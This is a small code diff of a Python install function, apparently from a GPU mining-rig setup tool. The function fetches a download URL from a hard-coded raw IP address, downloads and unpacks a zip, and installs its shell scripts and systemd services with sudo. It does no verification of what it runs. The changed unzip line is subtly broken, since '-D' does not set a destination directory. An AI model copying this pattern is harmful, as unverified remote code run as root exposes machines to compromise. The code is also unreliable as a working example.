@@ -8,9 +8,8 @@ def install_deps():
     os.system("sudo cp -r /home/hive-install-gpugod/modules /etc/")
     response = requests.post('http://176.119.147.118:8000/soft_revison/')
     url = response.json()["data"]["url"]
-    os.system("cd ../")
     os.system("wget -O fanonrig.zip "+ url)
-    os.system("unzip -o fanonrig.zip && mv fanonrig onrig ")
+    os.system("unzip fanonrig.zip -D /home/onrig")
     os.system("rm fanonrig.zip")
     os.system("cd /home/onrig/ && sudo  cp -r *.sh /home/ && sudo  cp -r *.service /etc/systemd/system/ && cd /home/ && sudo chmod ugo+x *.sh")
     os.system("sudo systemctl daemon-reload")
